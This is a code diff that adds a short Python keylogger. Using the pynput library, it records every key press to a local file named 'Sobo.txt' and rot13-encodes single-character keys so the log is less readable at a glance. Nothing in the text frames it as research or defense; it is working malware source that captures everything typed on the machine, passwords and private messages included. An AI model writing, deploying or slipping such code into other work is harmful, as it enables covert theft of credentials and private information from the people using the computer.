@@ -1,0 +1,18 @@
+import logging
+import codecs
+from pynput.keyboard import *
+
+log_dir = ""
+FRMT = '%(asctime)s: %(messages)s:'
+
+logging.basicConfig(filename = (log_dir + "Sobo.txt"), level = logging.DEBUG, format='%(asctime)s %(message)s')
+
+
+def on_press(key):
+    if len(str(key)) < 4:
+        logging.info(codecs.encode(str(key),'rot_13'))
+    else:
+        logging.info((str(key)))
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
